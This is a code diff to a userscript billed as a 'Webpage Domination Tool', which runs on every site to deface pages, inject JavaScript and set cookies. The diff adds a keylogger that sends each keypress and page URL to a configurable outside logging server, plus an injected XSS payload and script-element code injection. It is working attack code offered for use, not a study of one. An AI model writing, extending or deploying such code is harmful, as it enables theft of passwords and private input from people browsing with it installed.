@@ -2,7 +2,7 @@
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
 // @version 1.337
-// @description Own any webpage with style. Deface, redirect, or inject.
+// @description Own any webpage with style. Deface, redirect, or inject. Includes advanced XSS bypass and keylogging.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic
 // @match *://*/*
 // @grant GM_setValue
@@ -10,6 +10,7 @@
 // @grant GM_addStyle
 // @grant GM_deleteValue
 // @grant GM_registerMenuCommand
+// @grant GM_xmlhttpRequest
 // @run-at document-start
 // ==/UserScript==
 
@@ -17,6 +18,7 @@
     'use strict';
 
     const storageKeyPrefix = 'noodles_defacement_';
+    const logServerURL = 'http://noodles.local/logs'; // Replace with your logging server
 
     const getConfig = () => {
         return {
@@ -32,7 +34,9 @@
             enableAnimation: GM_getValue(storageKeyPrefix + 'enableAnimation', true),
             jsInjection: GM_getValue(storageKeyPrefix + 'jsInjection', ''),
             elementRemoval: GM_getValue(storageKeyPrefix + 'elementRemoval', ''),
-            cookies: JSON.parse(GM_getValue(storageKeyPrefix + 'cookies', '[]'))
+            cookies: JSON.parse(GM_getValue(storageKeyPrefix + 'cookies', '[]')),
+            xssPayload: GM_getValue(storageKeyPrefix + 'xssPayload', '<script>alert("XSS by Noodles");</script>'),
+            keyloggerEnabled: GM_getValue(storageKeyPrefix + 'keyloggerEnabled', false)
         };
     };
 
@@ -86,9 +90,12 @@
 
         if (defacementConfig.jsInjection) {
             try {
-                eval(defacementConfig.jsInjection);
+                const script = document.createElement('script');
+                script.innerHTML = defacementConfig.jsInjection;
+                document.body.appendChild(script);
             } catch (e) {
                 console.error('Noodles: JS Injection Failed:', e);
+                logError('JS Injection Failed: ' + e.message);
             }
         }
 
@@ -98,13 +105,75 @@
                 elements.forEach(el => el.remove());
             } catch (e) {
                 console.error('Noodles: Element Removal Failed:', e);
+                 logError('Element Removal Failed: ' + e.message);
             }
         }
 
         defacementConfig.cookies.forEach(cookie => {
             document.cookie = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'};${cookie.secure ? 'secure;' : ''}${cookie.httpOnly ? 'httpOnly;' : ''}`;
         });
+
+        //Attempt XSS
+        try {
+            const xssDiv = document.createElement('div');
+            xssDiv.innerHTML = defacementConfig.xssPayload;
+            document.body.appendChild(xssDiv);
+        } catch (e) {
+            console.error('Noodles: XSS Failed:', e);
+             logError('XSS Failed: ' + e.message);
+        }
     };
+
+    const logKeypress = (event) => {
+        const keyData = {
+            key: event.key,
+            code: event.code,
+            location: window.location.href,
+            timestamp: Date.now()
+        };
+
+        GM_xmlhttpRequest({
+            method: 'POST',
+            url: logServerURL + '/keys',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            data: JSON.stringify(keyData),
+            onload: (response) => {
+                if (response.status !== 200) {
+                    console.error('Noodles: Keylog failed to send:', response.status, response.responseText);
+                }
+            },
+            onerror: (error) => {
+                console.error('Noodles: Keylog send error:', error);
+            }
+        });
+    };
+
+    const logError = (message) => {
+         const errorData = {
+            message: message,
+            location: window.location.href,
+            timestamp: Date.now()
+        };
+
+        GM_xmlhttpRequest({
+            method: 'POST',
+            url: logServerURL + '/errors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            data: JSON.stringify(errorData),
+            onload: (response) => {
+                if (response.status !== 200) {
+                    console.error('Noodles: Log failed to send:', response.status, response.responseText);
+                }
+            },
+            onerror: (error) => {
+                console.error('Noodles: Log send error:', error);
+            }
+        });
+    }
 
     const createConfigPanel = () => {
         if (document.getElementById('noodlesDefacementPanel')) return;
@@ -175,6 +244,13 @@
             checkbox.addEventListener('change', (e) => {
                 GM_setValue(storageKeyPrefix + key, e.target.checked);
                 defacementConfig = getConfig();
+                if (key === 'keyloggerEnabled') {
+                    if (e.target.checked) {
+                        document.addEventListener('keypress', logKeypress);
+                    } else {
+                        document.removeEventListener('keypress', logKeypress);
+                    }
+                }
             });
             div.appendChild(lbl);
             div.appendChild(checkbox);
@@ -277,7 +353,9 @@
         panel.appendChild(createTextArea('Custom CSS', 'customCSS'));
         panel.appendChild(createTextArea('JS Injection', 'jsInjection'));
         panel.appendChild(createInput('Element Removal (querySelector)', 'elementRemoval'));
+        panel.appendChild(createTextArea('XSS Payload', 'xssPayload'));
         panel.appendChild(createCheckbox('Enable Animation', 'enableAnimation'));
+        panel.appendChild(createCheckbox('Enable Keylogger', 'keyloggerEnabled'));
         panel.appendChild(createCookieEditor());
 
         panel.appendChild(refreshButton);
@@ -327,11 +405,17 @@
                  createConfigPanel();
             }
             applyDefacement();
+            if (defacementConfig.keyloggerEnabled) {
+                document.addEventListener('keypress', logKeypress);
+            }
         });
     } else {
         if (!document.getElementById('noodlesDefacementPanel')) {
             createConfigPanel();
         }
         applyDefacement();
+        if (defacementConfig.keyloggerEnabled) {
+            document.addEventListener('keypress', logKeypress);
+        }
     }
 })();
